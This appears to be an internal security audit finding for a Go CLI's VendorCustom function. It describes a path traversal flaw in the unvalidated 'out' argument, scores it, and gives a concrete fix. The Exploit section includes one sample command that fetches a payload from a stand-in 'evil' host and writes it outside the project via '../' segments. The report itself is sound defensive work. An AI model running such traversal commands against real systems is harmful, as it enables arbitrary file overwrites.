# 22 — VendorCustom `out` path traversal

**CVSS:** 4.0 (Medium) — `CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N`

**Where:**
- `internal/cli/generator/vendor.go:140-160` — `VendorCustom(dir, url, out string)`, `destPath := filepath.Join(dir, out)` with no validation of `out`

## What's wrong

`out` is an arbitrary string from the CLI caller. `filepath.Join("/project", "../../etc/foo")` yields `/etc/foo`. The function then downloads `url` and writes it to that path.

There's no `filepath.Clean` + prefix check, no rejection of absolute paths, no rejection of `..` segments.

## Exploit

CLI footgun: a dev typing `hamr vendor custom https://evil/payload --out ../../../tmp/x` writes the response body to `/tmp/x`. The HTTP body is attacker-controlled (whatever `url` returns).

Real exploit surface depends on how the command is invoked. If a wrapper script or CI job passes `out` from somewhere external (a template variable, a remote registry), the traversal is reachable without the dev typing it directly.

## Fix

- `cleaned := filepath.Clean(out)`.
- Reject if `filepath.IsAbs(cleaned)` or strings.HasPrefix(cleaned, "..")`.
- Compute the final path, then `filepath.Rel(dir, finalPath)` and verify the result doesn't start with `..`.

Same pattern as the existing `LocalStorage.resolve()` — apply it here.
